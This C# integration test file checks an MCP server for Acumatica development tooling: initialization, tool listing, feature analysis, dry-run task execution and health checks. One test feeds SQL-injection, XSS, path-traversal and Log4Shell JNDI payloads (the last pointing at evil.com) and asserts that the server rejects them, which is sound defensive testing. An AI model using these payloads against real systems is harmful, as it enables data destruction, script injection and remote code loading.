using System.Text.Json.Nodes;
using FluentAssertions;

namespace StampliMCP.McpServer.Acumatica.Tests.IntegrationTests;

/// <summary>
/// Integration tests for Nuclear MCP 2025 tools
/// </summary>
[Collection("Sequential")]
[Trait("Category", "Integration")]
public sealed class NuclearToolsIntegrationTests : IDisposable
{
    private readonly List<string> _outputLines = new();
    private readonly McpTestClient _client;

    public NuclearToolsIntegrationTests()
    {
        _client = new McpTestClient(captureStderr: true, debugMode: false);
    }

    private void WriteLine(string message)
    {
        _outputLines.Add(message);
        Console.WriteLine(message);
    }

    [Fact]
    public async Task Server_Should_Initialize_Successfully()
    {
        // Act
        var response = await _client.Initialize();

        // Assert
        response.Should().NotBeNull();
        response["result"].Should().NotBeNull();

        var result = response["result"]!;
        result["protocolVersion"]?.GetValue<string>().Should().Be("2024-11-05");
        result["serverInfo"]?["name"]?.GetValue<string>().Should().Be("stampli-acumatica");
        result["serverInfo"]?["version"]?.GetValue<string>().Should().Be("2.0.0");

        WriteLine($"Server initialized: {result["serverInfo"]}");
    }

    [Fact]
    public async Task Server_Should_Expose_Only_Two_Tools()
    {
        // Arrange
        await _client.Initialize();

        // Act
        var tools = await _client.ListTools();

        // Assert
        tools.Should().NotBeNull();
        tools.Count.Should().Be(2, "Should only expose 2 tools: kotlin_tdd_workflow and health_check");

        var toolNames = tools.Select(t => t?["name"]?.GetValue<string>()).ToList();
        toolNames.Should().Contain("kotlin_tdd_workflow", "Main workflow tool must be present");
        toolNames.Should().Contain("health_check", "Diagnostic tool must be present");

        WriteLine($"Found {tools.Count} tools: {string.Join(", ", toolNames)}");
    }

    [Fact]
    public async Task KotlinWorkflow_Start_Should_Return_Complete_Knowledge()
    {
        // Arrange
        await _client.Initialize();

        // Act
        var result = await _client.CallTool("kotlin_tdd_workflow", new
        {
            command = "start",
            context = "export vendor to Acumatica",
            sessionId = (string?)null
        });

        // Assert
        result.Should().NotBeNull();

        // Check for session and phase
        result["sessionId"].Should().NotBeNull();
        result["phase"].Should().NotBeNull();
        result["phase"]!.GetValue<string>().Should().Be("RED");

        // Check that ALL knowledge is provided upfront
        var knowledge = result["knowledge"];
        knowledge.Should().NotBeNull();
        knowledge!["testCode"].Should().NotBeNull("Test template must be provided");
        knowledge["implementationCode"].Should().NotBeNull("Implementation template must be provided");
        knowledge["validationRules"].Should().NotBeNull("Validation rules must be provided");
        knowledge["errorMessages"].Should().NotBeNull("Error messages must be provided");
        knowledge["legacyFiles"].Should().NotBeNull("Legacy file pointers must be provided");

        // Check tasklist
        var tasklist = result["tasklist"] as JsonArray;
        tasklist.Should().NotBeNull();
        tasklist!.Count.Should().BeGreaterThan(0);

        // Verify task structure
        var firstTask = tasklist[0];
        firstTask?["id"].Should().NotBeNull();
        firstTask?["type"].Should().NotBeNull();
        firstTask?["action"].Should().NotBeNull();
        firstTask?["priority"].Should().NotBeNull();

        // Check summary
        var summary = result["summary"];
        summary.Should().NotBeNull();
        summary!["requires_review"]?.GetValue<bool>().Should().BeTrue();
        summary["ready_for_execution"]?.GetValue<bool>().Should().BeFalse();

        WriteLine($"Analysis ID: {result["analysis_id"]}");
        WriteLine($"Tasks generated: {tasklist.Count}");
    }

    [Fact]
    public async Task AnalyzeAcumaticaFeature_Quick_Mode_Should_Return_Minimal_Tasks()
    {
        // Arrange
        await _client.Initialize();

        // Act
        var result = await _client.CallTool("analyze_acumatica_feature", new
        {
            featureDescription = "Simple vendor lookup",
            analysisDepth = "quick",
            includeTestScenarios = false
        });

        // Assert
        result.Should().NotBeNull();

        var tasklist = result["tasklist"] as JsonArray;
        tasklist.Should().NotBeNull();

        // Quick mode should have fewer tasks
        tasklist!.Count.Should().BeLessThanOrEqualTo(3);

        var summary = result["summary"];
        summary?["estimated_complexity"]?.GetValue<string>().Should().BeOneOf("low", "medium");

        WriteLine($"Quick mode generated {tasklist.Count} tasks");
    }

    [Theory]
    [InlineData("'; DROP TABLE users;--")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("../../etc/passwd")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    public async Task AnalyzeAcumaticaFeature_Should_Reject_Injection_Attempts(string maliciousInput)
    {
        // Arrange
        await _client.Initialize();

        // Act
        var result = await _client.CallTool("analyze_acumatica_feature", new
        {
            featureDescription = maliciousInput,
            analysisDepth = "quick",
            includeTestScenarios = false
        });

        // Assert
        result.Should().NotBeNull();
        result["error"].Should().NotBeNull();

        var error = result["error"]?.GetValue<string>();
        error.Should().Contain("Invalid");

        WriteLine($"Rejected input: {maliciousInput}");
        WriteLine($"Error: {error}");
    }

    [Fact]
    public async Task AnalyzeAcumaticaFeature_Should_Reject_Oversized_Input()
    {
        // Arrange
        await _client.Initialize();
        var oversizedInput = new string('x', 501); // Over 500 char limit

        // Act
        var result = await _client.CallTool("analyze_acumatica_feature", new
        {
            featureDescription = oversizedInput,
            analysisDepth = "quick",
            includeTestScenarios = false
        });

        // Assert
        result.Should().NotBeNull();
        result["error"].Should().NotBeNull();
        result["error"]?.GetValue<string>().Should().Contain("500 character limit");
    }

    [Fact]
    public async Task ExecuteAcumaticaTasks_Should_Execute_DryRun()
    {
        // Arrange
        await _client.Initialize();

        // First, create an analysis
        var analysisResult = await _client.CallTool("analyze_acumatica_feature", new
        {
            featureDescription = "Export vendor to Acumatica",
            analysisDepth = "full",
            includeTestScenarios = true
        });

        var analysisId = analysisResult["analysis_id"]?.GetValue<string>();
        analysisId.Should().NotBeNull();

        // Act - Execute tasks in dry run mode
        var executeResult = await _client.CallTool("execute_acumatica_tasks", new
        {
            analysisId = analysisId,
            approvedTaskIds = new[] { 1, 2 },
            executionMode = "sequential",
            dryRun = true
        });

        // Assert
        executeResult.Should().NotBeNull();
        executeResult["execution_id"].Should().NotBeNull();
        executeResult["analysis_id"]?.GetValue<string>().Should().Be(analysisId);
        executeResult["dry_run"]?.GetValue<bool>().Should().BeTrue();

        var results = executeResult["results"] as JsonArray;
        results.Should().NotBeNull();
        results!.Count.Should().Be(2);

        // Check that tasks were simulated (dry run)
        foreach (var taskResult in results)
        {
            taskResult?["status"]?.GetValue<string>().Should().Be("success");
            taskResult?["result"]?.GetValue<string>().Should().Contain("[DRY RUN]");
        }

        var summary = executeResult["summary"];
        summary?["total_executed"]?.GetValue<int>().Should().Be(2);
        summary?["successful"]?.GetValue<int>().Should().Be(2);

        WriteLine($"Dry run executed {summary?["total_executed"]} tasks");
    }

    [Fact]
    public async Task ExecuteAcumaticaTasks_Should_Require_Valid_AnalysisId()
    {
        // Arrange
        await _client.Initialize();

        // Act - Try to execute with invalid analysis ID
        var result = await _client.CallTool("execute_acumatica_tasks", new
        {
            analysisId = "invalid_analysis_id",
            approvedTaskIds = new[] { 1 },
            executionMode = "sequential",
            dryRun = true
        });

        // Assert
        result.Should().NotBeNull();
        result["error"].Should().NotBeNull();
        result["error"]?.GetValue<string>().Should().Contain("Analysis not found");
    }

    [Fact]
    public async Task NuclearWorkflow_Complete_Cycle()
    {
        // Arrange
        await _client.Initialize();

        // Step 1: Analyze feature
        var analysisResult = await _client.CallTool("analyze_acumatica_feature", new
        {
            featureDescription = "Add vendor payment processing",
            analysisDepth = "full",
            includeTestScenarios = true
        });

        analysisResult.Should().NotBeNull();
        var analysisId = analysisResult["analysis_id"]?.GetValue<string>();
        analysisId.Should().NotBeNull();

        var tasklist = analysisResult["tasklist"] as JsonArray;
        tasklist.Should().NotBeNull();
        tasklist!.Count.Should().BeGreaterThan(0);

        WriteLine($"Step 1: Analysis created with {tasklist.Count} tasks");

        // Step 2: Review tasklist (simulated by test)
        var taskIds = tasklist
            .Take(2)
            .Select(t => t?["id"]?.GetValue<int>() ?? 0)
            .Where(id => id > 0)
            .ToArray();

        WriteLine($"Step 2: Approving tasks {string.Join(", ", taskIds)}");

        // Step 3: Execute approved tasks
        var executeResult = await _client.CallTool("execute_acumatica_tasks", new
        {
            analysisId = analysisId,
            approvedTaskIds = taskIds,
            executionMode = "sequential",
            dryRun = true
        });

        executeResult.Should().NotBeNull();
        executeResult["execution_id"].Should().NotBeNull();

        var summary = executeResult["summary"];
        summary?["total_executed"]?.GetValue<int>().Should().Be(taskIds.Length);

        WriteLine($"Step 3: Executed {summary?["total_executed"]} tasks successfully");
    }

    [Fact]
    public async Task HealthCheck_Should_Return_Status()
    {
        // Arrange
        await _client.Initialize();

        // Act
        var result = await _client.CallTool("health_check", new { });

        // Assert
        result.Should().NotBeNull();
        result["status"]?.GetValue<string>().Should().Be("ok");
        result["version"]?.GetValue<string>().Should().Be("2.0.0");
        result["serverName"]?.GetValue<string>().Should().Be("stampli-acumatica");
        result["timestamp"].Should().NotBeNull();

        var runtime = result["runtime"];
        runtime.Should().NotBeNull();
        runtime!["framework"].Should().NotBeNull();
        runtime["os"].Should().NotBeNull();

        var paths = result["paths"];
        paths.Should().NotBeNull();
        paths!["baseDirectory"].Should().NotBeNull();
        paths["knowledgeExists"]?.GetValue<bool>().Should().BeTrue();

        WriteLine($"Health check: {result["status"]} - {result["serverName"]} v{result["version"]}");
    }

    public void Dispose()
    {
        if (_client != null)
        {
            WriteLine("=== STDERR OUTPUT ===");
            WriteLine(_client.GetStderrOutput());
            _client.Dispose();
        }
    }
}